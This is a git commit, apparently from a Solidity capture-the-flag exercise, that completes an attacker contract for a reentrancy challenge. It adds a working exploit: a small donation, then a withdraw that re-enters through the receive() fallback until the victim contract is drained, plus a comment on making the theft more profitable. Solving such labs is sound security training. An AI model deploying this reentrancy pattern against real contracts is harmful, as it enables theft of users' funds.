76e9aa99f43a26b43e92eae857a5c7e7c837ed39
Kerem Kazan <kerem.kazan@gmail.com>
2022-05-16 14:10:14 -0400

    solved reentrance

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -9,7 +9,32 @@ contract AttackingReentrance {
         contractAddress = _contractAddress;
     }
 
+    function donate(uint value) private {
+        Reentrance(contractAddress).donate{value: value}(address(this));
+    }
+
+    function withdraw() private {
+        Reentrance(contractAddress).withdraw();
+    }
+
+    receive() external payable {
+        console.log("receiving");
+        // TODO: we can make a smaller number of calls to the contract by 
+        // re-depositing what we just withdrew, 
+        // doubling the amount we can withdraw each time,
+        // meaning we can finish this in O(logN) time instead of O(N)
+        // where N is the initial balance of the victim contract.
+        // this would effectively reduce our gas consumption and increase 
+        // our profits - albeit by a small margin.
+
+        if (contractAddress.balance > 0) {
+            withdraw();
+        }
+
+    }
+
     function hackContract() external {
-        // Code me!
+        donate(1);
+        withdraw();
     }
 }
